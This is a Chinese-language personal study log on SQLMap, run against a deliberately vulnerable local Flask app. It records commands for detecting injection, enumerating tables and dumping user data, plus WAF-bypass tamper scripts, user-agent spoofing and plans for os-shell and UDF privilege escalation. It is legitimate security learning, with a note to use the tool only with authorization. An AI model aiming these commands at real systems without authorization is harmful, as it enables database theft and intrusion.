# Kali Linux 每日学习 — 2026-04-07

## 今日工具：SQLMap

### 1. 工具定位
- **用途**：自动化 SQL 注入检测与利用
- **渗透测试阶段**：漏洞分析 / 漏洞利用
- **解决的问题**：发现 Web 应用中的 SQL 注入漏洞，自动完成检测、利用、数据提取

### 2. 实战操作

#### 实验环境
搭建了一个存在 SQL 注入漏洞的 Flask 应用（SQLite 内存数据库）：
- `/user?id=N` — 直接拼接 id 参数到 SQL 查询
- `/search?q=xxx` — LIKE 查询，同样存在注入

#### 关键命令记录

**基础检测（level=1, risk=1）：**
```bash
sqlmap --url "http://127.0.0.1:5000/user?id=1" --batch
```
`--batch`：自动回答所有交互提示，非交互模式

**枚举数据库（SQLite 无多数据库概念）：**
```bash
sqlmap --url "http://127.0.0.1:5000/user?id=1" --batch --dbs
# SQLite 输出：WARNING: on SQLite it is not possible to enumerate databases
```

**枚举表：**
```bash
sqlmap --url "http://127.0.0.1:5000/user?id=1" --batch --tables
```

**dump 表数据：**
```bash
sqlmap --url "http://127.0.0.1:5000/user?id=1" --batch --dump -T users
```

**更深度检测（level=2, risk=2）：**
```bash
sqlmap --url "http://127.0.0.1:5000/search?q=test" --batch --level=2 --risk=2
```
level：测试payload数量（1-5）
risk：攻击性payload（1-3）

**OS Shell（仅限 MySQL/PostgreSQL 等，SQLite 不支持）：**
```bash
sqlmap --url "http://127.0.0.1:5000/user?id=1" --batch --os-shell
# ERROR: on SQLite it is not possible to execute commands
```

### 3. SQLMap 检测到的注入类型

| 类型 | 说明 |
|------|------|
| boolean-based blind | AND 逻辑盲注，检测 4753=4753 恒真 |
| time-based blind | SQLite 专用时间盲注（heavy query） |
| UNION query | 联合查询，需 3 列，支持 NULL 字符 |

### 4. Tamper Scripts（绕过 WAF）

SQLMap 内置 72 个 tamper 脚本，位于 `/usr/share/sqlmap/tamper/`：
- `charencode.py` — URL编码绕过
- `base64encode.py` — Base64编码
- `between.py` — 用 BETWEEN 替换 `>`
- `equaltolike.py` — 用 LIKE 替换 `=`
- `space2comment.py` — 空格替换为 `/**/`

使用示例：
```bash
sqlmap --url "http://target" --tamper=between,charencode
```

### 5. 其他常用参数

```bash
--proxy=PROXY         # 通过代理发送请求（BurpSuite调试用）
--threads=4           # 并发线程数，加速检测
--randomize=PARAM     # 随机化指定参数值
--cookie="COOKIE"     # 需要认证时的Cookie
--data="POST数据"     # POST请求体
--smart              # 只做快速检测（高置信度目标）
-v VERBOSE            # 详细级别 0-6
```

### 6. 遇到的问题

- **SQLite 无 OS Shell**：SQLite 是嵌入式数据库，无 os.execute 等函数，无法执行系统命令。若目标是 MySQL/PostgreSQL，可进一步提权。
- **level=1 未检测到 UNION**：需要 `--level=2` 或更高才能触发 UNION 测试。
- **WAF 检测**：SQLMap 默认 User-Agent 可能被拦截，可用 `--random-agent` 伪装。

### 7. 安全提示

> ⚠️ SQLMap 是渗透测试工具，只在授权环境下使用。未授权扫描是违法行为。

### 8. 今日实验结果

成功通过 SQLMap 在 `http://127.0.0.1:5000/user?id=1` 发现并利用了 SQL 注入漏洞：
- 识别 DBMS 为 **SQLite**
- 枚举出 `users` 表
- Dump 出 4 条用户数据（admin, alice, bob, charlie）

### 9. 下一步学习方向

- [ ] 学习 BurpSuite 配合 SQLMap（代理抓包 + 被动扫描）
- [ ] 研究 SQLMap 的 `--os-pwn` 针对 MySQL 的 UDF 提权
- [ ] 对比 sqlmap vs sqlninja vs SQLChop
- [ ] 使用 sqlmap 的 `--wizard` 交互模式快速扫描
